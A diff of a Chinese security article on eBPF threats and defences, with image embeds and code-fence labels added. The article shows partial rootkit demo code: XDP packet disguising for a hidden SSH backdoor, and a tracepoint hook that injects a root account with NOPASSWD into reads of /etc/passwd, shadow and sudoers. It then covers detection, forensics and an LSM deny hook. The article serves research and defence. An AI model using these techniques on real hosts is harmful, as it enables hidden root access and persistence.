@@ -44,7 +44,7 @@ eBPF出现，以较小的子系统改动，保障了系统内核的稳定。具�
 **· DEF CON**
 
 在DEF CON29峰会上，安全研究员Pat Hogan也分享了一篇关于eBPF的恶意利用案例：**《Warping Reality - creating and countering the next generation of Linux rootkits using eBPF》**[文末链接-2] ，介绍了eBFP rootkit的应用场景，包括网络、运行时等，以及如何检测eBPF的恶意利用等。代码在https://github.com/pathtofile/bad-bpf 。
-
+![[Pasted image 20240920190924.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
  _**国内资料**_
@@ -73,7 +73,7 @@ eBPF出现，以较小的子系统改动，保障了系统内核的稳定。具�
   
 
 我们回顾一下eBPF技术的hook点：
-
+![[Pasted image 20240920190931.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
 从图中可以看出，eBPF的hook点功能包括以下几部分：
@@ -92,7 +92,7 @@ eBPF的功能覆盖XDP、TC、probe、socket等，每个功能点都能实现内
   
 
 笔者基于eBPF的功能函数，从业务场景来看，网络、监控、观测类的功能促进了云原生领域的产品发展；跟踪/性能分析、安全类功能，加快了安全防御、审计类产品演进；而安全领域的恶意利用，也会成为黑客关注的方向。在这里，笔者与大家探讨一下新的威胁与防御思路：
-
+![[Pasted image 20240920190939.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
   
@@ -115,7 +115,7 @@ eBPF的功能覆盖XDP、TC、probe、socket等，每个功能点都能实现内
 **·** **XDP/TC层修改TCP包**
 
 为了让后门隐藏的更好，最好是不开进程，不监听端口（当前部分我们只讨论网络层隐藏）。而eBPF技术在XDP、TC、socket等内核层的功能，能够实现流量信息修改，这些功能常被应用在L3、L4的网络负载均衡上。比如cilium的网络策略都是基于eBPF XDP实现。eBPF hook了XDP点后，更改了TCP包的目标IP，系统内核再将该数据包转发出去。按照XDP与TC在Linux内核中，处理ingress与egress的位置，可以更准确地确定hook点。
-
+![[Pasted image 20240920190946.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
 XDP的BPF_PROG_TYPE_XDP程序类型，可以丢弃、修改、重传来自ingress的流量，但无法对egress起作用。TC的BPF_PROG_TYPE_SCHED_CLS除了拥有XDP BPF_PROG_TYPE_XDP的功能外，还可以对egress起作用。
@@ -152,12 +152,13 @@ XDP/TC层的eBPF rootkit执行时，读取eBPF map里的密钥，进行比较运
 
 举个XDP处理ingress的例子：
 
-```
- 1SEC("xdp/ingress") 2int xdp_ingress(struct xdp_md *ctx) { 3struct cursor c; 4struct pkt_ctx_t pkt; 5 6//判断是否为SSHD的协议，不是则直接放行 7if (!(不是SSHD协议(&c))) { 8return XDP_PASS; 9}1011//判断rootkit是否匹配，网卡信息与来源端口是否匹配12hack_mac[] = "读取bpf map配置。"13if(密钥不匹配) {14return XDP_PASS;15}1617// 读取map，是否已经存在该client信息18struct netinfo client_key = {};19__builtin_memcpy(&client_key.mac, &pkt.eth->h_source, ETH_ALEN);2021struct netinfo *client_value;22client_value = bpf_map_lookup_elem(&ingress_client, &client_key);2324// 如果没找到伪装信息，则自己组装25if(!client_value) {26__builtin_memset(&client_value, 0, sizeof(client_value));27} else {28bpf_map_update_elem(&ingress_client, &client_key, &client_value, BPF_ANY);29}303132// 伪装mac局域网mac信息33pkt.eth->h_source[0] = 0x00;34...3536// 替换伪装ip来源 ，客户端端口不变3738// 更改目标端口39pkt.tcp->dest = htons(FACK_PORT);    //224041//计算TCP SUM layer 442ipv4_csum(pkt.tcp, sizeof(struct tcphdr), &csum);43pkt.tcp->check = csum;4445//写入已伪装的map，用于TC处理egress的原mac、IP信息还原。46return XDP_PASS;47}
+```c
+ 1SEC("xdp/ingress") 2int xdp_ingress(struct xdp_md *ctx) { 3struct cursor c; 4struct pkt_ctx_t pkt; 5 6//判断是否为SSHD的协议，不是则直接放行 
+ 7if (!(不是SSHD协议(&c))) { 8return XDP_PASS; 9}1011//判断rootkit是否匹配，网卡信息与来源端口是否匹配12hack_mac[] = "读取bpf map配置。"13if(密钥不匹配) {14return XDP_PASS;15}1617// 读取map，是否已经存在该client信息18struct netinfo client_key = {};19__builtin_memcpy(&client_key.mac, &pkt.eth->h_source, ETH_ALEN);2021struct netinfo *client_value;22client_value = bpf_map_lookup_elem(&ingress_client, &client_key);2324// 如果没找到伪装信息，则自己组装25if(!client_value) {26__builtin_memset(&client_value, 0, sizeof(client_value));27} else {28bpf_map_update_elem(&ingress_client, &client_key, &client_value, BPF_ANY);29}303132// 伪装mac局域网mac信息33pkt.eth->h_source[0] = 0x00;34...3536// 替换伪装ip来源 ，客户端端口不变3738// 更改目标端口39pkt.tcp->dest = htons(FACK_PORT);    //224041//计算TCP SUM layer 442ipv4_csum(pkt.tcp, sizeof(struct tcphdr), &csum);43pkt.tcp->check = csum;4445//写入已伪装的map，用于TC处理egress的原mac、IP信息还原。46return XDP_PASS;47}
 ```
 
 比较简单的demo，即可实现 ingtrss侧TCP数据包的伪装。同样，TC层处理egress方向的数据包时，只需要对伪装包的原始信息作还原即可。整个流程如下图：  
-
+![[Pasted image 20240920191011.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
 这样，rootkit的通讯链路并不影响正常用户访问，也没有对原系统做改动，隐蔽性特别好。
@@ -210,7 +211,7 @@ XDP/TC层的eBPF rootkit执行时，读取eBPF map里的密钥，进行比较运
 
 用户态实现/etc/passwd、/etc/shadow等文件payload的生成，并通过eBPF的RewriteConstants机制，完成对elf .rodata的字段值替换。
 
-```
+```python
  1import "github.com/ehids/ebpfmanager" 2 3//  通过elf的常量替换方式传递数据 4func (e *MBPFContainerEscape) constantEditor() []manager.ConstantEditor { 5    var username = RandString(9) 6    var password = RandString(9) 7    var s = RandString(8) 8 9    salt := []byte(fmt.Sprintf("$6$%s", s))10    // use salt to hash user-supplied password11    c := sha512_crypt.New()12    hash, err := c.Generate([]byte(password), salt)1314    var m = map[string]interface{}{}15    res := make([]byte, PAYLOAD_LEN)16    var payload = fmt.Sprintf("%s ALL=(ALL:ALL) NOPASSWD:ALL #", username)17    copy(res, payload)18    m["payload"] = res19    m["payload_len"] = uint32(len(payload))2021    // 生成passwd字符串22    var payload_passwd = fmt.Sprintf("%s:x:0:0:root:/root:/bin/bash\n", username)23    // 生成shadow字符串24    var payload_shadow = fmt.Sprintf("%s:%s:18982:0:99999:7:::\n", username, hash)2526    // eBPF RewriteContants27    var editor = []manager.ConstantEditor{28        {29            Name:          "payload",30            Value:         m["payload"],31            FailOnMissing: true,32        },33        {34            Name:          "payload_len",35            Value:         m["payload_len"],36            FailOnMissing: true,37            },38    }39    return editor40}4142func (this *MBPFContainerEscape) setupManagers() {43    this.bpfManager = &manager.Manager{44        Probes: []*manager.Probe{45            {46                Section:          "tracepoint/syscalls/sys_enter_openat",47                EbpfFuncName:     "handle_openat_enter",48                AttachToFuncName: "sys_enter_openat",49            },50            ...51        },5253        Maps: []*manager.Map{54            {55                Name: "events",56            },57        },58    }5960    this.bpfManagerOptions = manager.Options{61        ...62        // 填充 RewriteContants 对应map63        ConstantEditors: this.constantEditor(),64    }65}
 ```
 
@@ -218,12 +219,12 @@ XDP/TC层的eBPF rootkit执行时，读取eBPF map里的密钥，进行比较运
 
 **内核态使用payload**
 
-```
+```c
  1const volatile int payload_len = 0; 2... 3const volatile char payload_shadow[MAX_PAYLOAD_LEN]; 4 5SEC("tracepoint/syscalls/sys_exit_read") 6int handle_read_exit(struct trace_event_raw_sys_exit *ctx) 7{ 8    // 判断是否为rootkit行为，是否需要加载payload 9    ...10    long int read_size = ctx->ret;11    // 判断原buff长度是否小于payload12    if (read_size < payload_len) {13        return 0;14    }1516    // 判断文件类型，匹配追加相应payload17    switch (pbuff_addr->file_type)18    {19    case FILE_TYPE_PASSWD:20        // 覆盖payload到buf，不足部分使用原buff内容21        {22            bpf_probe_read(&local_buff, MAX_PAYLOAD_LEN, (void*)buff_addr);23            for (unsigned int i = 0; i < MAX_PAYLOAD_LEN; i++) {24                if (i >= payload_passwd_len) {25                    local_buff[i] = ' ';26                }27                else {28                    local_buff[i] = payload_passwd[i];29                }30            }31        }32        break;33    case FILE_TYPE_SHADOW:34        // 覆盖 shadow文件35        ...36        break;37    case FILE_TYPE_SUDOERS:38        //覆盖sudoers39        ...40        break;41    default:42        return 0;43        break;44    }454647    // 将payload内存写入到buffer48    ret = bpf_probe_write_user((void*)buff_addr, local_buff, MAX_PAYLOAD_LEN);49    // 发送事件到用户态5051    return 0;52}
 ```
 
 按照如上demo rootkit的设计，即完成了随机用户名密码的root账号添加。在鉴权认证上，也可以配合eBPF网络层恶意利用的demo，利用eBPF map交互，实现相应鉴权。但rootkit本身并没有更改硬盘上文件，不产生风险行为。并且，只针对特定进程的做覆盖，隐蔽性更好。整个流程如下图：
-
+![[Pasted image 20240920191054.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
 不管是在物理机上，还是给了root+BPF权限的容器上，都一样生效。
@@ -276,7 +277,7 @@ XDP/TC层的eBPF rootkit执行时，读取eBPF map里的密钥，进行比较运
     
 - 运行后
     
-
+![[Pasted image 20240920191106.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
   _**运行前**_ 
@@ -305,7 +306,7 @@ XDP/TC层的eBPF rootkit执行时，读取eBPF map里的密钥，进行比较运
 
 大部分eBPF程序类型都需要root权限的用户才能调用执行。但有几个例外，比如BPF_PROG_TYPE_SOCKET_FILTER和BPF_PROG_TYPE_CGROUP_SKB这两个类型，就不需要root。但需要读取系统配置开关。
 
-```
+```c
 1//https://elixir.bootlin.com/linux/v5.16.9/source/kernel/bpf/syscall.c#L224023if (type != BPF_PROG_TYPE_SOCKET_FILTER &&4        type != BPF_PROG_TYPE_CGROUP_SKB &&5        !bpf_capable())6        return -EPERM;
 ```
 
@@ -335,7 +336,7 @@ XDP/TC层的eBPF rootkit执行时，读取eBPF map里的密钥，进行比较运
   
 
 笔者认为，这确实可以缓解大部分bpf字节码加载的问题。但使用系统原生命令(tc\ip\bpftool等)加载的话，仍面临威胁。比如：ip link set dev ens33 xdp obj xdp-example_pass.o
-
+![[Pasted image 20240920191122.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
   
@@ -360,7 +361,7 @@ linux系统中，所有的程序运行，都必须进行系统调用，eBPF程�
 
 并且，所有的eBPF程序执行、map创建都必须进行这个syscall调用。那么，在这个必经之路进行拦截监控，是最好的方案。
 
-```
+```c
  1SEC("tracepoint/syscalls/sys_enter_bpf") 2int tracepoint_sys_enter_bpf(struct syscall_bpf_args *args) { 3    struct bpf_context_t *bpf_context = make_event(); 4    if (!bpf_context) 5        return 0; 6    bpf_context->cmd = args->cmd; 7    get_common_proc(&bpf_context->procinfo); 8    send_event(args, bpf_context); 9    return 0;10}
 ```
 
@@ -385,7 +386,7 @@ linux系统中，所有的程序运行，都必须进行系统调用，eBPF程�
   
 
 获取当前进程PID、COMM等特征，根据用户态写入eBPF map的配置，决定是否上报、是否拦截。也可以在用户态做过滤，但内核态效率更高。如果是做拦截，那必须要在内核态实现。参考**saBPF产品设计思路**[文末链接-8]，用eBPF实现LSM HOOK点的钩子程序，完成相关审计调用。**https://github.com/saBPF-project/sabpf-kernel** 项目代码还只是demo，思路可以借鉴。
-
+![[Pasted image 20240920191134.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
 **·** **根据SYSCALL类型筛选** 
@@ -465,7 +466,7 @@ linux系统中，所有的程序运行，都必须进行系统调用，eBPF程�
 _**bpftool工具**_
 
 **eBPF程序列表** 命令bpftool prog show，以及bpftool prog help查看更多参数。
-
+![[Pasted image 20240920191143.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
 结果中，可以看到当前系统正在运行的BPF程序、关联的BPF map ID，以及对应的进程信息等。另外，细心的你可能发现，结果中，XDP数据中并没有进程ID信息，稍后讨论。
@@ -473,7 +474,7 @@ _**bpftool工具**_
   
 
 **eBPF map列表** 命令bpftool map show，以及bpftool map help查看更多参数。
-
+![[Pasted image 20240920191148.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
 通过查看map信息，可以与程序信息作辅助矫正。并且，可以导出map内数据用来识别恶意进程行为。这部分我们在取证章节讨论。
@@ -484,14 +485,14 @@ _**bpflist-bpfcc**_
 
 bpflist-bpfcc -vv命令可以看到当前服务器运行的部分BPF程序列表。以笔者测试环境为例：
 
-```
+```c
 1root@vmubuntu:/home/cfc4n/project/xdp# bpflist-bpfcc  -vv2open kprobes:34open uprobes:56PID    COMM             TYPE  COUNT71      systemd          prog  8810444  ehids            map   4910444  ehids            prog  5
 ```
 
   
 
 可以看到系统进程systemd启动了8个prog程序。ehids进程创建了4个eBPF map与5个prog。但实际上前面也执行了ip link set dev ens33 xdp obj xdp-example_pass.o命令，在这里却没有显示出来。意味着这个命令输出的结果并不是所有bpf程序、map的情况。
-
+![[Pasted image 20240920191214.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
   
@@ -527,7 +528,7 @@ https://elixir.bootlin.com/linux/v5.16.10/source/tools/lib/bpf/netlink.c#L237
 
 笔者做了抓包验证，IP关联XDP程序类型：
 
-```
+```c
  117:53:22.553708 sendmsg(3,  2    { 3    msg_name={sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000},  4    msg_namelen=12,  5    msg_iov=[ 6        { 7            iov_base={ 8                {nlmsg_len=52, nlmsg_type=RTM_NEWLINK, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=1642672403, nlmsg_pid=0},  9                {ifi_family=AF_UNSPEC, ifi_type=ARPHRD_NETROM, ifi_index=if_nametoindex("ens33"), ifi_flags=0, ifi_change=0}, 10                {11                    {nla_len=20, nla_type=IFLA_XDP}, 12                    [13                        {{nla_len=8, nla_type=IFLA_XDP_FD}, 6}, 14                        {{nla_len=8, nla_type=IFLA_XDP_FLAGS}, XDP_FLAGS_UPDATE_IF_NOEXIST}15                    ]16                }17            },18            iov_len=5219        }20        ], 21    msg_iovlen=1, 22    msg_controllen=0, 23    msg_flags=024    }, 0) = 52
 ```
 
@@ -535,7 +536,7 @@ https://elixir.bootlin.com/linux/v5.16.10/source/tools/lib/bpf/netlink.c#L237
 
 可以看到IFLA_XDP_FD后面的FD参数是6。同样，删除XDP程序，需要把FD设置为-1，对应NETLINK包构成如下：
 
-```
+```c
  117:55:16.306843 sendmsg(3,  2    { 3    ... 4                    {nla_len=20, nla_type=IFLA_XDP},  5                    [ 6                        {{nla_len=8, nla_type=IFLA_XDP_FD}, -1},  7                        {{nla_len=8, nla_type=IFLA_XDP_FLAGS}, XDP_FLAGS_UPDATE_IF_NOEXIST} 8                    ] } 9    ...10    }, 0) = 52
 ```
 
@@ -551,7 +552,7 @@ _**检测机制**_
     
 2. tc filter show dev [网卡名] [ingress|egress]
     
-
+![[Pasted image 20240920191228.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
 _**使用bpftool命令查看**_
@@ -561,7 +562,7 @@ bpftool net show dev ens33 -p命令可以用于查看网络相关的eBPF hook点
   
 
 CGROUP的的BPF_PROG_TYPE_CGROUP_SKB、BPF_PROG_TYPE_CGROUP_SOCK类型程序的加载情况都可以通过bpftool prog show查看。长短生命周期的BPF程序区别是缺少用户空间进程PID信息。如下图：
-
+![[Pasted image 20240920191233.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
 **BPFFS**
@@ -579,7 +580,7 @@ BPFFS在linux的类型是BPF_FS_MAGIC，默认目录/sys/fs/bpf/，可自定义�
   
 
 在linux系统上，mount -t bpf来查看系统所有挂在的文件类型，是否包含BPFFS类型。
-
+![[Pasted image 20240920191241.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
 确定BPFFS的目录后，再查看目录下的挂在点是否存在异常。
@@ -592,7 +593,7 @@ BPFFS在linux的类型是BPF_FS_MAGIC，默认目录/sys/fs/bpf/，可自定义�
 
 bpftool工具可以导出有FD ID的PROG、MAP。 **BPF PROG程序** 可以导出opcode\visual\linum等多种格式，并可以生成调用关系图。具体可以查看bpftool的帮助文件。
 
-```
+```c
 1root@vmubuntu:/home/cfc4n# bpftool prog help2bpftool prog dump xlated PROG [{ file FILE | opcodes | visual | linum }]3bpftool prog dump jited  PROG [{ file FILE | opcodes | linum }]
 ```
 
@@ -600,14 +601,14 @@ bpftool工具可以导出有FD ID的PROG、MAP。 **BPF PROG程序** 可以导
 
 **BPF MAP** 与PROG类似，也可以通过bpftool导出内容，并支持json格式化内容。
 
-```
+```c
  1root@vmubuntu:/home/cfc4n# bpftool map dump id 20 2[{ 3        "value": { 4            ".rodata": [{ 5                    "target_ppid": 0 6                },{ 7                    "uid": 0 8                },{ 9                    "payload_len": 3810    ...
 ```
-
+![[Pasted image 20240920191256.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
 **BPFFS** BPFFS类型的BPF对象，虽然可以更便捷的放到后台执行，用户空间程序可以退出，也可以再次读取，但这也给取证带来很大便利。bpftool命令也支持从pinned到BPFFS文件系统的路径里导出PROG、MAP。参与少有区别，详情见bpftool help。
-
+![[Pasted image 20240920191307.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
   
@@ -623,7 +624,7 @@ bpftool工具可以导出有FD ID的PROG、MAP。 **BPF PROG程序** 可以导
   
 
 IDA pro加载时，我们可以在.noptrdata段部分看到这块代码，开始地址是0000000000827AE0，导出后再解压，可以还原原来的BPF ELF文件内容。
-
+![[Pasted image 20240920192121.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
 因为每个BPF用户态实现不同，类库也不一样，静态分析实践起来有难度。那可以模拟相同环境，动态运行，提前HOOK BPF SYSCALL，找到FD设置的地方，也是可以导出BPF的ELF文件。
@@ -633,7 +634,7 @@ IDA pro加载时，我们可以在.noptrdata段部分看到这块代码，开始
 **字节码分析**
 
 BPF字节码本身也是ELF格式，只是格式指令上有一定区别。反编译工具IDA pro也能支持，国外安全工程师开源了一个python插件：**eBPF IDA Proc** [文末链接-11] ，以及整理了一篇分析的文章**《****Reverse Engineering Ebpfkit Rootkit With BlackBerry's Enhanced IDA Processor Tool 》**[文末链接-12]，有兴趣可以读读。
-
+![[Pasted image 20240920192139.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
   _**防御**_ 
@@ -643,10 +644,10 @@ eBPF在网络安全场景的使用，除了做入侵检测外，还是可以用�
   
 
 同样，笔者认为eBPF也是二进制层最优秀的虚拟补丁、热更新解决方案。
-
+![[Pasted image 20240920192144.png]]
 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
-```
+```c
 1LSM_PROBE(bpf, int cmd, union bpf_attr *attr, unsigned int size)2{3    return -EPERM;4}
 ```
 
@@ -667,7 +668,7 @@ eBPF在网络安全场景的使用，除了做入侵检测外，还是可以用�
   
 
 笔者的产品也是参考datadog，抽象包装了cilium的eBPF库，实现配置化便捷管理eBPF程序。github仓库：**https://github.com/ehids/ebpfmanager** ，欢迎使用。
-
+![[Pasted image 20240920192158.png]]
